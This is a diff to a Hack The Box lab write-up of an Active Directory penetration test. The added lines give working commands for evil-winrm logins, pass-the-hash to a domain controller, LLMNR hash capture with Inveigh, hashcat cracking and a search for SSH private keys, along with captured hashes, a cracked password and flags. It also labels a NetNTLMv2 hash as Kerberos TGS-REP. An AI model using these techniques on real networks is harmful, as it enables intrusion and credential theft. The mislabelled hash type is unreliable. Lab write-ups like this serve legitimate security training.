@@ -856,7 +856,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
 ```
 It is up so we can use Evil-WinRM to remote in:
 ```
-proxychains evil-winrm -i 172.16.8.50 -u backupadm -p !qazXSW@
+proxychains evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
 ```
 Since WinRM uses a kerberos ticket to authenticate, we won't be able to authenticate when using certain tools due to the Kerberos double-hop problem, so we need to set up a PSCredential object using PowerView to workaround that. 
 
@@ -984,7 +984,11 @@ inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b1
 inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
 inlanefreight.local\wdill
 ```
-Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. Once we login, we see that we are finally domain and enterprise admin. We can now conclude this penetration test, however if we wanted to do post-exploitation to see if we can access other domains or collect as many credentials as we want, we can do so as well.
+Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. 
+```
+sudo proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
+```
+Once we login, we see that we are finally domain and enterprise admin. We can now conclude this penetration test, however if we wanted to do post-exploitation to see if we can access other domains or collect as many credentials as we want, we can do so as well.
 
 We find the final flag on the Administrator's desktop: 7c09eb1fff981654a3bb3b4a4e0d176a
 
@@ -1039,7 +1043,37 @@ which gives us the cookie on our netcat listener. We can then use a browser cook
 ```
 HTB{1nS3cuR3_c00k135}
 ```
-### Nineteenth Flag
+### Missed one HTB question:
+We also missed the NTLM hash for user mpalledorous when we were pentesting the host 172.16.8.50. When we privilege escalated to SYSTEM by using the SysaxAutomation exploit, we can run Inveigh or Responder to scan for NTLM hashes sent across the network through LLMNR. We import Inveigh.ps1 to the host through TSCLIENT and then run the following as SYSTEM privilege:
+```
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+```
+We eventually get the following hash:
+```
+mpalledorous::ACADEMY-AEN-DEV:1DCA13A4F4F2A4D3:743A2E969640EE1044E92FB2300A0B64:01010000000000006518101646A8DB01E7477FC05BA2BE5B0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008006518101646A8DB01060004000200000008003000300000000000000000000000002000001C0DA9CF79A3FD3728B9B1F4FAAC47C9A2369DF7C0EDB4EB1E2091D43D9976600A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
+```
+We can use hashid or other 3rd party tool to see that this is a Kerberos 5, etype 23, TGS-REP, therefore we can crack it with hashcat method 13100:
+```
+sudo hashcat -m 13100 hash.txt rockyou.txt
+```
+and we get 1squints2 as the password.
+
+### Post-Exploitation / Nineteenth Flag
+Now that we have domain admin, we can think about post-exploitation to cover our tracks as well as provide additional value to a hypothetical client by enumerating sensitive file shares. An example would be removing the acme/TESTING SPN that was created on the domain as well as all of the files and folders that we created on the machines we exploited. We can show access to HR information containing payroll data, as well as R&D information. We can also attempt to enumerate more networks in the hopes of finding paths to backup servers. 
+
+We check ifconfig /all on the domain controller and see that we are connected to the 172.16.9.0 subnet. We can run a ping sweep with the following command:
+```
+1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
+```
+Run this multiple times as for me it gave false negatives.
+
+We find that 172.16.9.25 is active. Next we can check for any id_rsa keys with the following command:
+```
+Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*id_rsa*" }
+```
+We can also just browse to Department Shares and find them in one of the IT folders. 
+
 
 
 
